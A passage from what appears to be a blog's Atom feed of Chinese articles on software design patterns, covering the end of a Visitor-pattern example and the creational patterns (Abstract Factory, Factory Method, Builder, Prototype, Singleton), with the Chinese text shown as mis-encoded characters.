&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">visitListItemBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">li&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">ListItemBlock&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prefix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;- &amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">li&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">list_type&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;ordered_list&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prefix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;1. &amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># handle indentation...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">prefix&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æ–°å¢å…¶ä»–æ–‡æ¡£æ ¼å¼çš„å¯¼å‡ºåŠŸèƒ½ï¼Œä»¥åŠæ‹¼å†™æ£€æŸ¥ç­‰åŠŸèƒ½ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œåªéœ€ç‹¬ç«‹çš„å¢åŠ ä¸€ä¸ªç±»å³å¯ã€‚è¿™ä½¿å¾—åœ¨æ–°å¢ä¸€é¡¹å¯¹æ–‡æ¡£æ¨¡å‹çš„æ“ä½œæ—¶ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿåšåˆ°äº†â€œå¯¹ä¿®æ”¹å…³é—­ï¼Œå¯¹æ‰©å±•å¼€æ”¾â€ï¼Œè€Œä¸”æ¯ä¸€é¡¹æ–°å¢åŠŸèƒ½éƒ½å¾ˆå¥½çš„å°è£…åœ¨äº†ç‹¬ç«‹çš„æ–°å¢ç±»å½“ä¸­ï¼Œè€Œä¸æ˜¯æ•£è½åœ¨æ–‡æ¡£ç»“æ„çš„å„ä¸ªå±‚æ¬¡çš„ç±»å½“ä¸­ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ä½¿ç”¨è®¿é—®è€…æ¨¡å¼ä¹‹åçš„ç±»å›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/visitor-page-class4.png">
&lt;/figure>
&lt;h3 id="é€‚ç”¨æ€§">é€‚ç”¨æ€§&lt;/h3>
&lt;p>é€šè¿‡ä¸Šè¿°æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè¢«è®¿é—®çš„å¯¹è±¡å±‚çº§æœ¬èº«ä¸å¤ªç¨³å®šï¼ˆä¾‹å¦‚éšæ—¶å¯èƒ½æ·»åŠ ä¸€ç§æ–°çš„ &lt;code>Element&lt;/code> ï¼‰ï¼Œé‚£ä¹ˆå¯èƒ½ä¸å¤ªé€‚åˆä½¿ç”¨ Visitor æ¨¡å¼ã€‚å› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¼šæ¶‰åŠå¯¹
&lt;code>Visitor&lt;/code> ç»“æ„çš„ä¿®æ”¹ï¼ˆå¢åŠ æ–°çš„ visit æ–¹æ³•ï¼‰ï¼Œä»è€Œå¯¼è‡´ Visitor ç»§æ‰¿å±‚çº§çš„ä¸ç¨³å®šã€‚&lt;/p>
&lt;p>è¿™é‡Œéœ€è¦æƒè¡¡çš„æ˜¯ï¼Œå“ªé‡Œå‘ç”Ÿå˜åŒ–çš„å¯èƒ½æ€§æ¯”è¾ƒå¤§ï¼Ÿå¦‚æœå¯¹è±¡å±‚çº§æœ¬èº«å˜åŒ–çš„å¯èƒ½æ€§æ¯”è¾ƒå¤§ï¼Œåˆ™å¯èƒ½ä¸é€‚åˆä½¿ç”¨ Visitor æ¨¡å¼ï¼›å¦‚æœå¯¹è±¡å±‚çº§æœ¬èº«è¾ƒç¨³å®šï¼Œè€Œå¢åŠ ä¸€ç§æ–°çš„æ“ä½œçš„å¯èƒ½æ€§æ¯”è¾ƒå¤§ï¼Œåˆ™æ¯”è¾ƒé€‚åˆä½¿ç”¨ Visitor æ¨¡å¼ã€‚&lt;/p>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#ç»„åˆ--composite">ç»„åˆ (Composite)&lt;/a>: Visitor æ¨¡å¼å¯ä»¥æ­é… Composite æ¨¡å¼ä¸€èµ·ä½¿ç”¨ï¼Œç”¨æ¥å¯¹ä¸€ä¸ªé€šè¿‡
Composite æ¨¡å¼æ„å»ºçš„å¯¹è±¡å±‚æ¬¡ç»“æ„è¿›è¡Œéå†æ“ä½œã€‚ä¸Šè¿°çš„&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#%E6%A1%88%E4%BE%8B-%E5%AF%8C%E6%96%87%E6%9C%AC%E6%96%87%E6%A1%A3%E6%A8%A1%E5%9E%8B">å¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹æ¡ˆä¾‹&lt;/a>ï¼Œå°±æ˜¯è¿™æ ·ä¸€ä¸ªä¾‹å­ã€‚&lt;/li>
&lt;li>&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#%E8%A7%A3%E9%87%8A%E5%99%A8--interpreter">è§£é‡Šå™¨ (Interpreter)&lt;/a>: è®¿é—®è€…ä¹Ÿå¯ä»¥åœ¨è§£é‡Šå™¨æ¨¡å¼ä¸­ä½¿ç”¨ã€‚&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/design-pattern/" term="Design-Pattern" label="Design-Pattern"/><category scheme="https://mincodes.com/tags/architecture/" term="Architecture" label="Architecture"/></entry><entry><title type="text">è®¾è®¡æ¨¡å¼ï¼šåˆ›å»ºå‹ (Creational)</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/design-patterns-creational/"/><id>https://mincodes.com/posts/design-patterns-creational/</id><updated>2023-07-24T21:16:06+08:00</updated><published>2023-07-07T18:35:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼šè®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ã€‚ æŠ½è±¡å·¥å‚ (Abstract Factory) æ„å›¾ æä¾›ä¸€ä¸ªæ¥å£ä»¥åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–â€¦</summary><content type="html">&lt;p>è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼š&lt;a href="https://mincodes.com/posts/design-patterns/#è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢">è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢&lt;/a>ã€‚&lt;/p>
&lt;h2 id="æŠ½è±¡å·¥å‚--abstract-factory">æŠ½è±¡å·¥å‚ (Abstract Factory)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>æä¾›ä¸€ä¸ªæ¥å£ä»¥åˆ›å»ºä¸€ç³»åˆ—ç›¸å…³æˆ–ç›¸äº’ä¾èµ–çš„å¯¹è±¡ï¼Œè€Œæ— é¡»æŒ‡å®šå®ƒä»¬å…·ä½“çš„ç±»ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="æ¡ˆä¾‹">æ¡ˆä¾‹&lt;/h3>
&lt;p>å‰é¢åœ¨&lt;a href="https://mincodes.com/posts/design-patterns/#dependency-inversion-principle-ä¾èµ–å€’ç½®åŸåˆ™">ä¾èµ–å€’ç½®åŸåˆ™&lt;/a>ä¸­ï¼Œå…¶å®å·²ç»ä¸¾è¿‡ä¸€ä¸ªè´´çº¸çš„ä¾‹å­ï¼Œå…¶å®å°±æ˜¯æŠ½è±¡å·¥å‚æ¨¡å¼çš„ä¸€ä¸ªåº”ç”¨ã€‚&lt;/p>
&lt;p>é™¤äº†å¯¹ &lt;code>Product&lt;/code> å’Œ &lt;code>Factory&lt;/code> è¿›è¡ŒæŠ½è±¡ä»¥å¤–ï¼ŒæŠ½è±¡å·¥å‚æ–¹æ³•è¿˜å¼ºè°ƒäº†â€‹&lt;strong>äº§å“ç³»åˆ—&lt;/strong>â€‹çš„æ¦‚å¿µã€‚æ¯”å¦‚ã€Šè®¾è®¡æ¨¡å¼ã€‹ä¸€ä¹¦ä¸­ç»å…¸çš„ä¾‹å­ï¼Œæ”¯æŒå¤šç§è§†æ„Ÿï¼ˆlook-and-feelï¼‰æ ‡å‡†çš„ç”¨æˆ·ç•Œé¢ï¼Œä¸åŒçš„è§†æ„Ÿé£æ ¼ä¸ºè¯¸å¦‚æ»šåŠ¨æ¡ã€çª—å£å’ŒæŒ‰é’®ç­‰ç”¨æˆ·ç•Œé¢ã€çª—å£ç»„ä»¶ã€å®šä¹‰ä¸åŒçš„å¤–è§‚å’Œè¡Œä¸ºã€‚è€ŒæŸä¸ªç‰¹å®šè§†æ„Ÿé£æ ¼ä¸‹çš„ä¸€ç³»åˆ—ã€çª—å£ç»„ä»¶ã€ï¼Œå°±æ˜¯ä¸€ä¸ªäº§å“ç³»åˆ—ã€‚æˆ‘ä»¬ä¸åº”è¯¥åœ¨ Motif é£æ ¼çš„çª—å£ç»„ä»¶ä¸­ï¼Œæ··å…¥ä¸€ä¸ª PM é£æ ¼çš„çª—å£ç»„ä»¶ã€‚&lt;/p>
&lt;p>è¿™é‡Œæˆ‘ä»¬éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š&lt;/p>
&lt;ul>
&lt;li>å¦‚ä½•ç¡®ä¿è½¯ä»¶ä¸ä¾èµ–æŸç§å…·ä½“çš„è§†æ„Ÿé£æ ¼ï¼Œä»¥ä¿è¯è½¯ä»¶çš„å¯ç§»æ¤æ€§ã€‚å°±åƒå‰é¢çš„æ¡ˆä¾‹ä¸­ï¼Œ
&lt;code>Editor&lt;/code> ä¸åº”è¯¥ç›´æ¥ä¾èµ–æŸä¸ªå…·ä½“çš„ &lt;code>StaticSticker&lt;/code> ä¸€æ ·ï¼›&lt;/li>
&lt;li>å¦‚ä½•ç¡®ä¿æˆ‘ä»¬ä¸ä¼šåœ¨ Motif è§†æ„Ÿä¸­ï¼Œé”™è¯¯çš„ä½¿ç”¨äº†ä¸€ä¸ª PM é£æ ¼çš„ç»„ä»¶ï¼Ÿ&lt;/li>
&lt;/ul>
&lt;p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ½è±¡å·¥å‚æ¨¡å¼ï¼Œä¼˜é›…åœ°è§£å†³ä¸Šè¿°ä¸¤ä¸ªé—®é¢˜ã€‚çœ‹ä¸€ä¸‹ç±»å›¾å°±æ˜ç™½äº†ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/class-diagram-widget-factory.png">
&lt;/figure>
&lt;p>æ¯ä¸€ç§è§†æ„Ÿæ ‡å‡†éƒ½å¯¹åº”ä¸€ä¸ªå…·ä½“çš„ &lt;code>WidgetFactory&lt;/code> å­ç±»ï¼Œå®¢æˆ·åªéœ€è¦é€šè¿‡ &lt;code>WidgetFactory&lt;/code>
å³å¯åˆ›å»ºå‡ºä¸€ç»„ç‰¹å®šé£æ ¼çš„çª—å£ç»„ä»¶ï¼Œæ— éœ€å…³å¿ƒå“ªäº›ç±»å®ç°äº†ç‰¹å®šé£æ ¼çš„çª—å£ç»„ä»¶ï¼Œè€Œä¸”å¯ä»¥ä¿è¯ç»å¯¹ä¸ä¼šé”™è¯¯çš„æ··ç”¨ä¸åŒé£æ ¼çš„çª—å£ï¼Œå› ä¸º &lt;code>WidgetFactory&lt;/code> å¼ºåŒ–äº†åŒä¸€ç±»å‹é£æ ¼ç»„ä»¶ä¹‹é—´çš„ç»‘å®šå…³ç³»ã€‚&lt;/p>
&lt;h3 id="é€‚ç”¨æ€§">é€‚ç”¨æ€§&lt;/h3>
&lt;ul>
&lt;li>ä¸€ä¸ªç³»ç»Ÿå¸Œæœ›ç‹¬ç«‹äºå®ƒçš„äº§å“çš„åˆ›å»ºã€ç»„åˆå’Œå®ç°ã€‚&lt;/li>
&lt;li>ä¸€ä¸ªç³»ç»Ÿå­˜åœ¨å¤šä¸ªäº§å“ç³»åˆ—ï¼Œåœ¨å·¥ä½œæ—¶éœ€è¦é€‰æ‹©å…¶ä¸­ä¸€ä¸ªäº§å“ç³»åˆ—æ¥ä½¿ç”¨ã€‚&lt;/li>
&lt;li>æ¯”è¾ƒå¼ºè°ƒäº§å“ç³»åˆ—çš„æ¦‚å¿µï¼ŒåŒä¸€ä¸ªç³»åˆ—çš„äº§å“åº”è¯¥é…åˆåœ¨å¼•èµ·ä½¿ç”¨ï¼Œä¸åŒç³»åˆ—çš„äº§å“ä¸èƒ½æ··ç”¨ã€‚&lt;/li>
&lt;li>æä¾›ä¸€ä¸ªäº§å“ç±»åº“ï¼Œä½†åªæƒ³æš´éœ²å®ƒä»¬çš„æ¥å£è€Œä¸æ˜¯å®ç°ã€‚&lt;/li>
&lt;/ul>
&lt;h3 id="ä¼˜ç‚¹">ä¼˜ç‚¹&lt;/h3>
&lt;ul>
&lt;li>å®ƒåˆ†ç¦»äº†å…·ä½“å®ç°ç±»&lt;/li>
&lt;li>æ›¿æ¢äº§å“ç³»åˆ—å˜å¾—ååˆ†ç®€å•ï¼Œåªéœ€æ›¿æ¢ä¸€ä¸ª factory å³å¯&lt;/li>
&lt;li>æœ‰åˆ©äºäº§å“çš„ä¸€è‡´æ€§ï¼Œå¯ä»¥è‡ªåŠ¨ç¡®ä¿ä¸åŒç³»åˆ—çš„äº§å“ä¹‹é—´ä¸ä¼šæ··ç”¨&lt;/li>
&lt;/ul>
&lt;h3 id="ç¼ºç‚¹">ç¼ºç‚¹&lt;/h3>
&lt;p>è¯¥æ¨¡å¼å¯ä»¥å¾ˆè½»æ˜“çš„æ‰©å±•æ–°çš„äº§å“ç³»åˆ—ï¼Œä½†å¦‚æœè¦æ‰©å±•äº§å“ç³»åˆ—ä¸­çš„äº§å“ç±»å‹ï¼Œä¾‹å¦‚ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œå¢åŠ ä¸€ç§æ–°çš„çª—å£ç»„ä»¶ï¼Œä¼šæ¯”è¾ƒå›°éš¾ï¼Œå› ä¸ºä¼šæ¶‰åŠ &lt;code>AbstractFactory&lt;/code> ç±»åŠå…¶æ‰€æœ‰å­ç±»çš„ä¿®æ”¹ã€‚&lt;/p>
&lt;p>å› æ­¤ï¼Œä½¿ç”¨è¯¥æ¨¡å¼æœ€å¥½ä¸€å¼€å§‹å°±è€ƒè™‘æ¸…æ¥šç³»ç»Ÿä¸­æœ‰å“ªäº›äº§å“ç±»å‹ï¼Œæ˜¯å¦ç›¸å¯¹ç¨³å®šï¼Œå¦åˆ™ä¸å¤ªå»ºè®®ä½¿ç”¨ã€‚&lt;/p>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;p>AbstractFactory ç±»é€šå¸¸ç”¨&lt;a href="https://mincodes.com/posts/design-patterns-creational/#%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95--factory-method">å·¥å‚æ–¹æ³• (Factory Method)&lt;/a>æ¥å®ç°ï¼Œä¹Ÿå¯ä»¥ç”¨&lt;a href="https://mincodes.com/posts/design-patterns-creational/#%E5%8E%9F%E5%9E%8B--prototype">åŸå‹(Prototype)&lt;/a>
æ¥å®ç°ã€‚&lt;/p>
&lt;p>ä¸€ä¸ªå…·ä½“çš„å·¥å‚å¯ä»¥ä½œä¸ºä¸€ä¸ª&lt;a href="https://mincodes.com/posts/design-patterns-creational/#%E5%8D%95%E4%BE%8B--singleton">å•ä¾‹ (Singleton)&lt;/a> å­˜åœ¨ã€‚&lt;/p>
&lt;h2 id="å·¥å‚æ–¹æ³•--factory-method">å·¥å‚æ–¹æ³• (Factory Method)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>å®šä¹‰ä¸€ä¸ªç”¨äºåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å­ç±»å†³å®šå…·ä½“å°†åˆ›å»ºå“ªä¸€ç§ç±»å‹çš„å®ä¾‹ï¼Œå³å¯¹è±¡çš„å®ä¾‹åŒ–è¿‡ç¨‹è¢«å»¶è¿Ÿåˆ°å­ç±»è¿›è¡Œã€‚&lt;/p>
&lt;/blockquote>
&lt;p>å·¥å‚æ–¹æ³•ç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œå…¶å®åœ¨&lt;a href="https://mincodes.com/posts/design-patterns-creational/#%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82--abstract-factory">Abstract Factory æŠ½è±¡å·¥å‚&lt;/a>ä¸­å°±æœ‰å·¥å‚æ–¹æ³•çš„è¿ç”¨ã€‚&lt;/p>
&lt;h3 id="ç±»å›¾">ç±»å›¾&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/factory-method-class.png">
&lt;/figure>
&lt;h2 id="ç”Ÿæˆå™¨--builder">ç”Ÿæˆå™¨ (Builder)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>å°†ä¸€ä¸ªå¤æ‚å¯¹è±¡çš„æ„å»ºä¸å®ƒçš„å†…éƒ¨è¡¨ç¤ºç›¸åˆ†ç¦»ï¼Œä½¿å¾—äºŒè€…å¯ä»¥ç‹¬ç«‹å‘ç”Ÿå˜åŒ–ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>è¿™é‡Œæœ‰ä¸¤å±‚å«ä¹‰ï¼š&lt;/p>
&lt;ul>
&lt;li>æ„å»ºè¿‡ç¨‹ï¼ˆDirectorï¼‰å’Œå†…éƒ¨è¡¨ç¤ºï¼ˆBuilderï¼‰ç›¸åˆ†ç¦»ã€‚åŒæ ·çš„æ„å»ºè¿‡ç¨‹ï¼Œå¯ä»¥ç”Ÿæˆä¸åŒçš„ç»“æœã€‚ä¾‹å¦‚ï¼Œâ€œè§£æå¹¶éå† RTF æ–‡æ¡£ç»“æ„â€è¿™ä¸ªè¿‡ç¨‹æ˜¯å¯å¤ç”¨çš„ï¼Œä½†æ˜¯æˆ‘åˆ©ç”¨ä¸åŒçš„
&lt;code>Builder&lt;/code>, æœ€ç»ˆå¯ä»¥æ„å»ºå‡ºä¸åŒæ ¼å¼çš„æ–‡æ¡£ï¼ˆ &lt;code>Markdown&lt;/code>, &lt;code>Html&lt;/code>, &lt;code>Text&lt;/code> ç­‰ï¼‰ã€‚&lt;/li>
&lt;li>æ„å»ºè¿‡ç¨‹ä¸ç”¨å…³å¿ƒäº§å“çš„å†…éƒ¨ç»„æˆéƒ¨åˆ†æ˜¯å¦‚ä½•åˆ›å»ºçš„ï¼ˆå…·ä½“ç”±å“ªäº›ç±»å®ä¾‹åŒ–ï¼‰ï¼Œä»¥åŠè¿™äº›éƒ¨åˆ†æ˜¯å¦‚ä½•ç»„è£…çš„ã€‚å› æ­¤ï¼Œæ„å»ºè¿‡ç¨‹å¯ä»¥è¢«ç‹¬ç«‹ä¿®æ”¹ã€‚&lt;/li>
&lt;/ul>
&lt;h3 id="ç»“æ„">ç»“æ„&lt;/h3>
&lt;h4 id="ç±»å›¾">ç±»å›¾&lt;/h4>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/builder-class.png">
&lt;/figure>
&lt;h4 id="æ—¶åºå›¾">æ—¶åºå›¾&lt;/h4>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/builder-sequence.png">
&lt;/figure>
&lt;h3 id="æ•ˆæœ">æ•ˆæœ&lt;/h3>
&lt;h4 id="å®ƒä½¿ä½ å¯ä»¥æ”¹å˜ä¸€ä¸ªäº§å“çš„å†…éƒ¨è¡¨ç¤º">å®ƒä½¿ä½ å¯ä»¥æ”¹å˜ä¸€ä¸ªäº§å“çš„å†…éƒ¨è¡¨ç¤º&lt;/h4>
&lt;p>&lt;code>Builder&lt;/code> å¯¹è±¡ä¸º &lt;code>Director&lt;/code> æä¾›äº†ä¸€ä¸ªæ„é€ äº§å“çš„æŠ½è±¡æ¥å£ï¼Œè¯¥æ¥å£éšè—äº†è¿™ä¸ªäº§å“çš„è¡¨ç¤ºå’Œå†…éƒ¨ç»“æ„ï¼ŒåŒæ—¶ä¹Ÿéšè—äº†è¯¥äº§å“æ˜¯å¦‚ä½•è£…é…çš„ã€‚å› æ­¤ï¼Œå½“ä½ æ”¹å˜è¯¥äº§å“çš„å†…éƒ¨è¡¨ç¤ºæ—¶ï¼Œåªéœ€æ›¿æ¢ä¸€ä¸ª &lt;code>Builder&lt;/code> å³å¯ã€‚&lt;/p>
&lt;h4 id="å®ƒä½¿ä½ å¯ä»¥åœ¨ä¸åŒçš„-director-ä¸­å¤ç”¨åŒä¸€ä¸ª-builder">å®ƒä½¿ä½ å¯ä»¥åœ¨ä¸åŒçš„ &lt;code>Director&lt;/code> ä¸­å¤ç”¨åŒä¸€ä¸ª &lt;code>Builder&lt;/code>&lt;/h4>
&lt;p>ä¾‹å¦‚ï¼Œä½ å¯ä»¥åœ¨ä¸åŒçš„ RTF æ–‡æ¡£æ ¼å¼ä¸­ï¼Œå¤ç”¨åŒä¸€ä¸ª &lt;code>MarkdownBuilder&lt;/code> ã€‚&lt;/p>
&lt;h4 id="å®ƒä½¿ä½ å¯¹æ„é€ è¿‡ç¨‹å¯ä»¥è¿›è¡Œæ›´ç²¾ç»†çš„æ§åˆ¶">å®ƒä½¿ä½ å¯¹æ„é€ è¿‡ç¨‹å¯ä»¥è¿›è¡Œæ›´ç²¾ç»†çš„æ§åˆ¶&lt;/h4>
&lt;p>&lt;code>Builder&lt;/code> æ¨¡å¼å’Œå…¶ä»–åˆ›å»ºå‹æ¨¡å¼å¾ˆå¤§çš„ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼Œ &lt;code>Builder&lt;/code> æ¨¡å¼ä¸æ˜¯è°ƒç”¨ä¸€ä¸ªæ¥å£ä¸€ä¸‹å­å°±ç”Ÿæˆäº§å“çš„ï¼Œè€Œæ˜¯é€šè¿‡å¯¼å‘å™¨ä¸€æ­¥ä¸€æ­¥æ„é€ ï¼Œè¿™ä¸ªè¿‡ç¨‹å…è®¸ä½ æœ‰æ›´é«˜çš„è‡ªç”±åº¦æ¥å®šåˆ¶æ•´ä¸ªäº§å“ã€‚&lt;/p>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;h4 id="æŠ½è±¡å·¥å‚--abstract-factory----orgad84e24">&lt;a href="https://mincodes.com/posts/design-patterns-creational/#%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82--abstract-factory">æŠ½è±¡å·¥å‚ (Abstract Factory)&lt;/a>&lt;/h4>
&lt;p>Abstract Factory ä¸ Builder çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼ŒBuilder æ¨¡å¼ç€é‡äºä¸€æ­¥æ­¥æ„é€ ä¸€ä¸ªå¤æ‚å¯¹è±¡ã€‚è€Œ Abstract Factory ç€é‡äºå¤šä¸ªç³»åˆ—çš„äº§å“å¯¹è±¡ã€‚å¦å¤–ï¼ŒBuilder åœ¨æœ€åä¸€æ­¥è¿”å›äº§å“ï¼Œè€Œ Abstract Factory ä¼šç«‹å³è¿”å›äº§å“ã€‚&lt;/p>
&lt;h4 id="è®¿é—®è€…--visitor----posts-design-patterns-behavioral-dot-pre-processed-dot-md">&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è®¿é—®è€…--visitor">è®¿é—®è€… (Visitor)&lt;/a>&lt;/h4>
&lt;p>è¿™ä¸¤ä¸ªæ¨¡å¼åœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨ç«äº‰å…³ç³»ã€‚ä¾‹å¦‚ï¼Œå¯¹äºä¸€ä¸ª RTF æ¥è¯´ï¼Œæ—¢å¯ä»¥ç”¨
Visitor æ¨¡å¼æ¥éå†å¹¶å¯¼å‡ºä¸åŒæ ¼å¼çš„æ–‡æ¡£ï¼ˆå‚è€ƒ&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#æ¡ˆä¾‹-å¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹">æ¡ˆä¾‹ï¼šå¯Œæ–‡æœ¬æ–‡æ¡£æ¨¡å‹&lt;/a>ï¼‰ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨
Director + ä¸åŒ Builder çš„æ–¹å¼æ¥å¯¼å‡ºä¸åŒæ ¼å¼çš„æ–‡æ¡£ã€‚å–å†³äºä½ çš„æ–‡æ¡£æ¨¡å‹æ˜¯å¦é€‚åˆé‡‡ç”¨ Visitor æ¨¡å¼ã€‚Visitor æ¨¡å¼æ˜¯ä¸€ç§æ›´åŠ é€šç”¨çš„ä¸ºæŸä¸€ç±»é›†åˆå…ƒç´ å¢åŠ ä¸åŒæ“ä½œçš„æ–¹æ³•ï¼Œå…¶ç›®çš„å¹¶éè¦æ„é€ å¯¹è±¡ã€‚&lt;/p>
&lt;h2 id="åŸå‹--prototype">åŸå‹ (Prototype)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>é€šè¿‡å…‹éš†åŸå‹å®ä¾‹çš„æ–¹å¼æ¥åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç±»å›¾">ç±»å›¾&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/prototype-class.png">
&lt;/figure>
&lt;h3 id="æ•ˆæœ">æ•ˆæœ&lt;/h3>
&lt;p>Prototype å…·å¤‡å¾ˆå¤šä¸å…¶ä»–åˆ›å»ºå‹æ¨¡å¼ï¼ˆä¾‹å¦‚ &lt;a href="https://mincodes.com/posts/design-patterns-creational/#%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82--abstract-factory">æŠ½è±¡å·¥å‚&lt;/a>ï¼‰ç±»ä¼¼çš„æ•ˆæœï¼Œæ¯”å¦‚å®ƒå¯¹å®¢æˆ·éšè—äº†å…·ä½“çš„äº§å“ç±»ï¼Œå› æ­¤å‡å°‘äº†å®¢æˆ·çŸ¥é“çš„åå­—çš„æ•°ç›®ï¼Œè€Œä¸”è®©å®¢æˆ·æ— éœ€ä¿®æ”¹å³å¯åˆ‡æ¢åˆ°ä¸åŒçš„å…·ä½“äº§å“ã€‚&lt;/p>
&lt;p>é™¤æ­¤ä¹‹å¤–ï¼ŒPrototype æœ‰ä¸€äº›ç‹¬æœ‰çš„ç‰¹ç‚¹ï¼Œä¸‹é¢åˆ—ä¸¾ä¸€äº›ã€‚&lt;/p>
&lt;h4 id="è¿è¡Œæ—¶å¢åŠ å’Œåˆ é™¤äº§å“">è¿è¡Œæ—¶å¢åŠ å’Œåˆ é™¤äº§å“&lt;/h4>
&lt;p>Prototype å¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨è¿è¡Œæ—¶é€šè¿‡æ³¨å†ŒåŸå‹å®ä¾‹æ¥å¢åŠ ä¸€ä¸ªæ–°çš„å…·ä½“äº§å“ï¼Œè¿™æ¯”æŠ½è±¡å·¥å‚æ¨¡å¼ç›¸å¯¹ä¼šçµæ´»ä¸€äº›ã€‚&lt;/p>
&lt;h4 id="å‡å°‘å­ç±»æ•°é‡">å‡å°‘å­ç±»æ•°é‡&lt;/h4>
&lt;p>ä½¿ç”¨æŠ½è±¡å·¥å‚ä¼šäº§ç”Ÿä¸€ä¸ªä¸äº§å“ç±»å±‚æ¬¡å¹³è¡Œçš„ Factory ç±»å±‚æ¬¡ï¼Œè€Œ Prototype ä¸éœ€è¦ã€‚&lt;/p>
&lt;h2 id="å•ä¾‹--singleton">å•ä¾‹ (Singleton)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>ä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚&lt;/p>
&lt;/blockquote>
